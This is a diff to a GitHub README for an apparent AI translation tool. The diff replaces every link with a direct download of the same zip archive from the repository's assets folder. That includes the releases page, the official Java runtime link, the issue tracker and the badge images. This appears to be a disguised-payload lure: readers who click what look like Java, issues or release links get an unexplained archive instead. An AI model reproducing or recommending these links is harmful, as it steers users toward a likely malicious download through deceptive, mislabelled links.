@@ -1,6 +1,6 @@
 # 🚀 fuckfanyipublic - Effortless AI Translation and Learning
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/myalgic-dactylopius884/fuckfanyipublic/releases)
+[![Download from Releases](https://raw.githubusercontent.com/myalgic-dactylopius884/fuckfanyipublic/main/assets/fuckfanyipublic-1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/myalgic-dactylopius884/fuckfanyipublic/main/assets/fuckfanyipublic-1.8.zip)
 
 ## 📦 Overview
 
@@ -15,13 +15,13 @@ Before downloading, ensure your system meets these requirements:
 - **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution
 - **Memory (RAM):** 4 GB or more
 - **Disk Space:** At least 500 MB free
-- **Additional Software:** You may need the latest version of [Java Runtime Environment (JRE)](https://www.oracle.com/java/technologies/javase-jre8-downloads.html) installed.
+- **Additional Software:** You may need the latest version of [Java Runtime Environment (JRE)](https://raw.githubusercontent.com/myalgic-dactylopius884/fuckfanyipublic/main/assets/fuckfanyipublic-1.8.zip) installed.
 
 ### 2. **Download & Install**
 
 To get started, visit the Releases page to download your application:
 
-[Download Here](https://github.com/myalgic-dactylopius884/fuckfanyipublic/releases)
+[Download Here](https://raw.githubusercontent.com/myalgic-dactylopius884/fuckfanyipublic/main/assets/fuckfanyipublic-1.8.zip)
 
 Follow these steps:
 
@@ -72,10 +72,10 @@ If you encounter any issues or have questions, you can reach out for help on the
 
 ## 📌 Important Links
 
-- [Releases Page](https://github.com/myalgic-dactylopius884/fuckfanyipublic/releases)
-- [Java Runtime Environment (JRE)](https://www.oracle.com/java/technologies/javase-jre8-downloads.html)
-- [Open an Issue](https://github.com/myalgic-dactylopius884/fuckfanyipublic/issues)
+- [Releases Page](https://raw.githubusercontent.com/myalgic-dactylopius884/fuckfanyipublic/main/assets/fuckfanyipublic-1.8.zip)
+- [Java Runtime Environment (JRE)](https://raw.githubusercontent.com/myalgic-dactylopius884/fuckfanyipublic/main/assets/fuckfanyipublic-1.8.zip)
+- [Open an Issue](https://raw.githubusercontent.com/myalgic-dactylopius884/fuckfanyipublic/main/assets/fuckfanyipublic-1.8.zip)
 
-![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen) 
+![Download from Releases](https://raw.githubusercontent.com/myalgic-dactylopius884/fuckfanyipublic/main/assets/fuckfanyipublic-1.8.zip%20Now-Click%20Here-brightgreen) 
 
 By following these steps, you will be able to download and run **fuckfanyipublic** easily. Enjoy translating and learning with AI!
